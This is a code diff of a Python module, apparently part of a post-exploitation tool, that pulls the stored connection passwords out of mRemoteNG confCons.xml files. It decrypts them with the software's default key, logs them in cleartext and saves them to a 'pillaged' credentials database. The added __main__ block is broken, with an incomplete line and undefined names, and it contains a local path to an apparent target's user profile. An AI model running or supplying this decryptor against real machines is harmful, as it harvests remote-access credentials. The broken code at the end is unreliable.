@@ -67,63 +67,55 @@ class mRemoteNG():
                                 self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
                                 self.logging.debug(ex)
 
-    def print_infos(self, node,username):
-        try:
-            name = node.attrib['Name']
-            username_ = node.attrib['Domain'] + '\\' + node.attrib['Username']
-            destination = node.attrib['Protocol'] + '://' + node.attrib['Hostname'] + ':' + node.attrib['Port']
-            encrypted_password = node.attrib['Password']
-            encrypted_data = encrypted_password.strip()
-            encrypted_data = base64.b64decode(encrypted_data)
-            self.logging.debug(
-                f"[] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{name}:{username_} @ {destination} : {encrypted_password}{bcolors.ENDC}")
-            salt = encrypted_data[:16]
-            associated_data = encrypted_data[:16]
-            nonce = encrypted_data[16:32]
-            ciphertext = encrypted_data[32:-16]
-            tag = encrypted_data[-16:]
-            default_password = "mR3m"
-            if ciphertext != b'':
-                key = hashlib.pbkdf2_hmac("sha1", default_password.encode(), salt, 1000, dklen=32)
 
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                cipher.update(associated_data)
-                plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode('utf8')
-                self.logging.info(
-                    f"[] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{username_}:{plaintext} @ {destination}{bcolors.ENDC}")
-
-                self.db.add_credz(credz_type='MRemoteNG',credz_username=f"{username_}",credz_password=plaintext,credz_target=str(destination),credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
-        except Exception as ex:
-            self.logging.debug(
-                f"[] {bcolors.WARNING}Exception in mRemoteNG Process Node of {localfile}{bcolors.ENDC}")
-            self.logging.debug(ex)
-
-    def print_recur(self, node,username):
-        if node.tag == 'Node':
-            self.print_infos(node,username)
-            for elem in list(node):
-                try:
-                    self.print_recur(elem,username)
-                except Exception as ex:
-                    self.logging.debug(
-                        f"[] {bcolors.WARNING}Exception in mRemoteNG element {elem}{bcolors.ENDC}")
-                    self.logging.debug(ex)
-                    continue
 
     def process_file(self,localfile,username):
         try:
             if "confCons.xml" in localfile:
                 tree = ET.parse(localfile)
                 root = tree.getroot()
+                #Extraire l'element Username et Password pour chaque node
                 for node in list(root):
-                    self.print_recur(node,username)
-                return 0
+                    try:
+                        name=node.attrib['Name']
+                        username_=node.attrib['Domain']+'\\'+node.attrib['Username']
+                        destination=node.attrib['Protocol']+'://'+node.attrib['Hostname']+':'+node.attrib['Port']
+                        encrypted_password=node.attrib['Password']
+                        encrypted_data = encrypted_password.strip()
+                        encrypted_data = base64.b64decode(encrypted_data)
 
+                        salt = encrypted_data[:16]
+                        associated_data = encrypted_data[:16]
+                        nonce = encrypted_data[16:32]
+                        ciphertext = encrypted_data[32:-16]
+                        tag = encrypted_data[-16:]
+                        default_password="mR3m"
+                        self.logging.debug(
+                            f"[{self.options.target_ip}] [mRemoteNG] Decrypting with {salt}:{nonce} {ciphertext} {tag}@ {username_}@ {destination}")
 
+                        key = hashlib.pbkdf2_hmac("sha1", default_password.encode(), salt, 1000, dklen=32)
+
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        cipher.update(associated_data)
+                        plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode('utf8')
+                        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{username_}:{plaintext} @ {destination}{bcolors.ENDC}")
+
+                        self.db.add_credz(credz_type='MRemoteNG',credz_username=f"{username_}",credz_password=plaintext,credz_target=str(destination),credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
+                    except Exception as ex:
+                        self.logging.debug(
+                            f"[{self.options.target_ip}] {bcolors.WARNING}Exception in mRemoteNG Process Node of {localfile}{bcolors.ENDC}")
+                        self.logging.debug(ex)
+                        continue
+                return 1
         except Exception as ex:
             self.logging.debug(
-                f"[] {bcolors.WARNING}Exception in mRemoteNG ProcessFile {localfile}{bcolors.ENDC}")
+                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in mRemoteNG ProcessFile {localfile}{bcolors.ENDC}")
             self.logging.debug(ex)
 
 
-
+if __name__ == "__main__":
+    filename="/Users/pav/Documents/CloudStation/Hack/Login/TI/NUMEN/interne/dpp/test4/10.75.0.2/Users/solivi08/AppData/Roaming/mRemoteNG/confCons.xml"
+    #hash=binascii.unhexlify(hash)
+    a=mRemoteNG()
+    a.
+    a.reverse_vncpassword(hash=hash)
